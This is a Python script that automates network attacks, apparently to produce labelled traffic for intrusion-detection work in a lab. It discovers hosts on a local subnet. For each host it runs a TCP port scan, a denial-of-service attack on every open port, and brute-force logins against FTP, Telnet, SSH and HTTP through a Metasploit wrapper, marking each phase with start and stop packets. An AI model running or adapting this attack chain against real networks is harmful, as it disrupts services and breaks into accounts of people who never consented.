from scanner import Scanner
from packet import send_packet
from metasploit import Metasploit

scanner = Scanner(initial_scan=False)
send_packet("hostscan", "192.168.12.1", "start", "04:cf:4b:3b:00:38")
scanner.search_hosts()
send_packet("hostscan", "192.168.12.1", "stop", "04:cf:4b:3b:00:38")


connected_ips = [(host.ip, host.mac) for host in scanner.hosts if host.mac]
print(f"Found connected devices with these ip addresses: {connected_ips}")

metasploit = Metasploit()
for connected_ip in connected_ips:
    send_packet("tcp_portscan", connected_ip[0], "start", connected_ip[1])
    ports = metasploit.tcp_portscan_attack(connected_ip[0])
    send_packet("tcp_portscan", connected_ip[0], "stop", connected_ip[1])

    for port in ports:
        send_packet("dos", connected_ip[0], "start", connected_ip[1])
        metasploit.dos_attack(connected_ip[0], port)
        send_packet("dos", connected_ip[0], "stop", connected_ip[1])

    send_packet("ftp_wordlist", connected_ip[0], "start", connected_ip[1])
    metasploit.brute_force_login(connected_ip[0], 'ftp')
    send_packet("ftp_wordlist", connected_ip[0], "stop", connected_ip[1])

    send_packet("telnet_wordlist", connected_ip[0], "start", connected_ip[1])
    metasploit.brute_force_login(connected_ip[0], 'telnet')
    send_packet("telnet_wordlist", connected_ip[0], "stop", connected_ip[1])

    send_packet("ssh_wordlist", connected_ip[0], "start", connected_ip[1])
    metasploit.brute_force_login(connected_ip[0], 'ssh')
    send_packet("ssh_wordlist", connected_ip[0], "stop", connected_ip[1])

    send_packet("http_wordlist", connected_ip[0], "start", connected_ip[1])
    metasploit.brute_force_login(connected_ip[0], 'http')
    send_packet("http_wordlist", connected_ip[0], "stop", connected_ip[1])


